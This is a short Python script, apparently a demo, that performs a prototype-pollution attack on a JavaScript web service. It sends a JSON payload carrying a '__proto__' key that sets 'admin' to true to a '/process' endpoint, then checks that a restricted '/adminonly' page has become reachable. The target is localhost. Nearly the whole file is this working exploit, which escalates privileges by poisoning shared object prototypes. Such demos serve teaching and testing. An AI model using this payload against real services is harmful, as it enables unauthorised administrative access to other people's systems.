# JavaScript Prototype Poisoning attack demo Python 3 implementation

'''
pip install requests
'''

import requests

payload = {
    'a': 5,
    'b': 3,
    '__proto__': {
        'admin': True
    }
}

def exploit(host, payload):
    restricted_url = host + '/adminonly'
    exploitable_url = host + '/process'

    # Check access
    print('##### This will fail:')
    print( requests.get(restricted_url) )

    # Run exploit
    print('##### Running exploit...')
    print( requests.post(exploitable_url, json=payload))
    print('Done.')

    # Re-check access
    print('##### This will succeed:')
    print( requests.get(restricted_url) )

if __name__ == '__main__':
    exploit('http://127.0.0.1:8080', payload)
